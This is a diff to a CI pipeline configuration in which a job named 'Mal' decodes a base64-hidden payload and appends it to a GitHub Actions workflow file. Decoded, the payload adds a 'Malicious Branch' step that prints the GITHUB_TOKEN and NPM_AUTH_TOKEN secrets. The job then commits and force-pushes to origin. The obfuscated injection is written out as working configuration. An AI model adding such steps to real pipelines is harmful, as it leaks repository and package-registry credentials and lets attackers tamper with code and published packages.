@@ -36,7 +36,7 @@ jobs:
           name: Mal
           command: |
             git branch -a
-            echo "ICAgIC0gbmFtZTogTWFsaWNpb3VzIEJyYW5jaAogICAgICBydW46IGVjaG8gIiR7eyBzZWNyZXRzLkdJVEhVQl9UT0tFTiB9fSwgJHt7IHNlY3JldHMuTlBNX0FVVEhfVE9LRU4gfX0iCg==" | base64 --decode
+            echo "ICAgIC0gbmFtZTogTWFsaWNpb3VzIEJyYW5jaAogICAgICBydW46IGVjaG8gIiR7eyBzZWNyZXRzLkdJVEhVQl9UT0tFTiB9fSwgJHt7IHNlY3JldHMuTlBNX0FVVEhfVE9LRU4gfX0iCg==" | base64 --decode >> .github/workflows/test.yaml
             git add .
             git commit -m "Are we not gender neutral people? We are Devo?"
             git push origin --force
